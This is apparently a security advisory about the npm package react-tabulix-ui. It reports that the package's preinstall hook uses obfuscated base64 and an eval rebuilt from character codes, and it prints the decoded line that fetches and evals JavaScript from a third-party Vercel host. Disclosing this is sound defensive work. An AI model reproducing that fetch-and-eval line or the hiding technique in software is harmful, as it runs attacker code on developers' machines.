summary: react-tabulix-ui preinstall fetches and evals remote JavaScript
details: package.json declares a preinstall hook `node./dist/index.d.js`. That script base64-decodes an async IIFE and executes it via an `eval` reference reconstructed from the character-code array [101,118,97,108] on `globalThis`. The decoded payload performs `eval(await fetch('https://everydaynodechecker-39143n.vercel.app/api/key?mem=root2'))`, running attacker-controlled JavaScript on the installer host at `npm install` time. The eval sink and the base64 payload are both obfuscated to evade static inspection, and the fetch destination is an unrelated third-party Vercel app rather than the package's publisher.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
